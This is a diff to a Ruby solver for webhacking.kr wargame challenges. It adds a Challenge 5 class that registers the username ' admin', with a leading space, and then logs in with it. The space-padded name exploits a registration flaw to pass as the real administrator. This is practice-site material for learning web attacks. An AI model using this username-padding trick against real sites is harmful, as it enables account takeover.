@@ -238,6 +238,39 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 5
+  class Challenge5 < ChallengeBase
+    CHALLENGE = 5
+
+    PATH = '/challenge/web-05/'
+    PATH_LOGIN = "#{PATH}mem/login.php"
+    PATH_JOIN = "#{PATH}mem/join.php"
+    LOGIN = ' admin'
+    PASSWORD = 'pw'
+
+    def exec
+      log("Registering the user '#{LOGIN}'")
+      response = post(
+        PATH_JOIN,
+        {
+          'id' => LOGIN,
+          'pw' => PASSWORD
+        }
+      )
+
+      log('Logging in')
+      response = post(
+        PATH_LOGIN,
+        {
+          'id' => LOGIN,
+          'pw' => PASSWORD
+        }
+      )
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 6
   class Challenge6 < ChallengeBase
     CHALLENGE = 6
